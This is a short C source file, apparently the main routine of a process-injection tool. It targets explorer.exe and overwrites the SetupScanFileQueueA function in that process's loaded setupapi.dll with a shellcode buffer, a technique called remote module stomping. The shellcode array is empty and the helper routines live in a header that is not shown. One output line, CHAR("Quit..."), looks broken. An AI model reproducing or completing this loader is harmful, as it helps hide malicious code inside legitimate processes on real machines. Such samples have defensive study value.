#include "RemoteStompingInjection.h"

#define TARGET_DLL L"setupapi.dll"
#define TARGET_DLL_FUNCTION "SetupScanFileQueueA"

int main()
{

		UCHAR Shellcode[] = {
	
		};

	SIZE_T PayloadSize = sizeof(Shellcode);
	HANDLE ProcessHandle = NULL;

	if (!GetProcessHandleAndPid(L"explorer.exe", &ProcessHandle))
	{
		PRINT_ERROR("GetProcessHandleAndPid");
		return 1;
	}

	if (!StompRemoteModule(TARGET_DLL, TARGET_DLL_FUNCTION, ProcessHandle, Shellcode, PayloadSize))
	{
		PRINT_ERROR("StompRemoteModule");
		return 1;
	}

	CHAR("Quit...");
	getchar();

	return 0;

}